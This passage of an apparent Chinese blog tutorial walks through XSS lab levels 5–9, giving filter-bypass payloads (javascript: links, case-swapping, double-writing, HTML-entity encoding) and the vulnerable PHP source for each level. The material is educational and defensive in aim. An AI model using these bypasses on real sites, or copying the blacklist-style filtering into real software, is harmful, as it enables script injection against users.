<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     //注意本题不可以使用onclik </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于编码，有需要的可以下载插件：CaptfEncoder,编码的作用在于可以绕过一些明文的过滤</p>
<hr>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//使用str_replace替换字符  过滤了&lt;  使用伪协议不会涉及&lt; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进一步解释实例化转义函数Htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $str = &quot;Tom&#x27;s \&quot;house\&quot; &amp; &lt;garden&gt;&quot;;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str);                // 默认: Tom&#x27;s&amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_QUOTES);    // 转义单引号: Tom&amp;#039;s &amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_NOQUOTES);  // 不转义引号: Tom&#x27;s &quot;house&quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>简化流程，由于是输入框类型，直接输入语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_21.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号没有被实例化转义或过滤</li>
<li>实现了字符逃逸</li>
<li>script标签被替换</li>
<li>使用onclick,也会被替换（自主测试，不演示）</li>
</ul>
<p>过滤script则不用script,用伪协议</p>
<p>情况与level5类似，则选择语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_22.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_23.png" class="" title="在这里插入图片描述">
<ul>
<li>标签实现逃逸</li>
<li>href 被替换</li>
</ul>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="*大小写绕过"></a>*大小写绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<ul>
<li>疑问：为什么前面的关卡不使用大小写绕过呢？或是说为什么这关可以使用大小写绕过？代码分析解答</li>
</ul>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);  <span class="comment">//替换script标签</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);          <span class="comment">//替换on </span></span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);		 <span class="comment">//替换src</span></span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);    <span class="comment">//替换data</span></span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);   <span class="comment">//替换href</span></span><br><span class="line"><span class="comment">//常规的伪协议无法绕过</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//这里存在两个很大的破绽:</span></span><br><span class="line"><span class="comment">//1.没有先实例化转义变量$str6,只是进行’部分有限‘的’黑名单‘标签替换，就拼接到value的值，</span></span><br><span class="line"><span class="comment">//2.str_replace函数默认区分大小写的且是严格匹配的（只有一样的字符才会被替换）</span></span><br><span class="line"><span class="comment">//1+2-&gt;大小写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前面的关卡中 level1根本没必要替换 level2在拼接value的值之前就实例化转义了 level3 level4 level5 同理</span></span><br><span class="line"><span class="comment">//为什么在拼接value的值之前就实例化转义了就无法使用大小写绕过呢？</span></span><br><span class="line"><span class="comment">//首先，输入框类型的重点在于如何处理value 1.闭合-&gt;逃逸  2.加属性 </span></span><br><span class="line"><span class="comment">//加属性不需要讨论，要实现逃逸就要使用&quot;闭合value,但&quot;被实例化转义，因此大小写绕过不能实现，即都没有满足1，即使满足2，也无法实现大小写绕过</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>类型：输入款类型</p>
<p>解题思路：<br>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_24.png" class="" title="在这里插入图片描述">

<ul>
<li>script 被替换为空</li>
<li>成功逃逸</li>
<li>双引号没有别实例化转义或替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_25.png" class="" title="在这里插入图片描述">

<ul>
<li>两次测试结果一样，那就说明有点异样了</li>
<li>说明被变量的英文字符被统一转为小写后再进行替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_26.png" class="" title="在这里插入图片描述">

<ul>
<li>实现逃逸</li>
<li>javascript中的script被替换为空</li>
<li>下面的 “”&gt;” 实为原有input标签的后面部分–&gt;浏览器的容错</li>
<li>href也替换为空</li>
</ul>
<blockquote>
<p>由以上的三次测试，发现闭合逃逸是可以实现的，只不过是某些标签和属性会被替换为空。</p>
</blockquote>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="*双写绕过"></a>*双写绕过</h3><p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;123&quot;);<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span> </span><br><span class="line">&quot; oonnclick=&#x27;alert(&quot;123&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>分析双写</li>
</ul>
<p>scscriptript 第一次匹配从第三个字符开始，即sc script ript 删除后即为 script</p>
<p> 对于其他伪协议等测试不不再测试（写得太累了(&lt;!_!&gt;)）–&gt;源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输入框类型中需要闭合value的类型实现双写绕过的三个条件：</span></span><br><span class="line"><span class="comment">//1.在拼接value之前，变量没有被实例化转义（&quot;会被实例化转义）</span></span><br><span class="line"><span class="comment">//2.对应字符别替换为空</span></span><br><span class="line"><span class="comment">//3.在整个过程中，只实现一次替换</span></span><br><span class="line"><span class="comment">//1+2+3-&gt;双写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入：test</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_27.png" class="" title="在这里插入图片描述">

<ul>
<li>输入内容被拼接到超链接中-&gt;可以尝试伪协议</li>
</ul>
<p> 输入： javascript:alert(“123”)</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_28.png" class="" title="在这里插入图片描述">
<ul>
<li>javascript中的script被替换,且不是替换为空</li>
<li>括号内的第一个双引号被实例化转义</li>
</ul>
<p> （其他伪协议类型自主测试）</p>
<p>由上可知：</p>
<ul>
<li>括号内不应再使用双引号，尝试使用单引号</li>
</ul>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="*编码绕过"></a>*编码绕过</h3><p>原理：*补充知识 目录有解释</p>
<blockquote>
<p>原语句：javascript:alert(“123”)<br>unicode 编码（16进制）：</p>
<blockquote>
<p><code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0022&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0022&amp;#x0029 </code></p>
</blockquote>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_29.png" class="" title="在这里插入图片描述">
<p>成功绕过</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);  <span class="comment">//统一转为小写-&gt;防止大小写绕过</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="comment">//以上为替换字符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> <span class="comment">//添加链接使用了最为简单的方法：echo 加标签</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>查看网页源码可知,可以尝试插入伪协议</p>
<p>但是,无论输入那种伪协议，网页源码始终为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_30.png" class="" title="在这里插入图片描述">

<p>输入:</p>
<blockquote>
<p>http:&#x2F;&#x2F;<br>至于为什么输入，全靠经验</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_31.png" class="" title="在这里插入图片描述">
<p>输入:</p>
<blockquote>
<p> 123http:&#x2F;&#x2F;<br> http:&#x2F;&#x2F; ashjdhj<br>以上语句都会被添加</p>
</blockquote>
<ul>
<li>所以只要识别到http:&#x2F;&#x2F;就会添加（源码分析会解释）</li>
</ul>
<h3 id="注释："><a href="#注释：" class="headerlink" title="*注释："></a>*注释：</h3><p> 现在思考如何将 http:&#x2F;&#x2F;嵌入伪协议的js代码中而不影响其执行<br> -&gt;使用注释</p>
<blockquote>
<p>&#x2F;&#x2F;  在js中为单行注释<br>&#x2F;**&#x2F; 在js中为多行注释</p>
</blockquote>
<p>尝试输入：</p>
<blockquote>
<p>javascript:alert(‘123’)&#x2F;* http:&#x2F;&#x2F; *&#x2F;<br>javascript:alert(‘123’)&#x2F;&#x2F; http:&#x2F;&#x2F; </p>
</blockquote>
<p>都可以被成功添加</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_32.png" class="" title="在这里插入图片描述">

<ul>
<li>script被替换且不为空-&gt;尝试大小写绕过</li>
</ul>
<p>输入：</p>
<blockquote>
<p>javasCript:alert(‘123’) &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_33.png" class="" title="在这里插入图片描述">

<ul>
<li>可知变量被统一转为小写，后被替换</li>
</ul>
<p>尝试：注释+编码</p>
<p>输入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0027&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0027&amp;#x0029&amp;#x0020&amp;#x002f&amp;#x002a&amp;#x0068&amp;#x0074&amp;#x0074&amp;#x0070&amp;#x003a&amp;#x002f&amp;#x002f&amp;#x002a&amp;#x002f</span></span><br><span class="line">上述为javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">/*http://*/</span> unicode编码的结果</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_34.png" class="" title="在这里插入图片描述">

<ul>
<li>插入失败，这是为什么呢？</li>
</ul>
<p>分析原因：</p>
<blockquote>
<p>unicode编码后的字符会被浏览器自动解码，但是服务器不会解码（指后端没有对unicode解码的代码程序），所以后端代码接受到的是一堆‘奇怪’字符，由于没有严格识别到http:&#x2F;&#x2F; ，所以不会将变量值拼拼接<br>解决措施：</p>
<blockquote>
<p>对于javascript的script中任意(不限数量)字符进行unicode编码</p>
</blockquote>
</blockquote>
<p>输入语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">javascrip&amp;<span class="comment">#x0074:alert(&#x27;123&#x27;) /*http://*/ </span></span><br><span class="line">t  -&gt; &amp;<span class="comment">#x0074</span></span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span 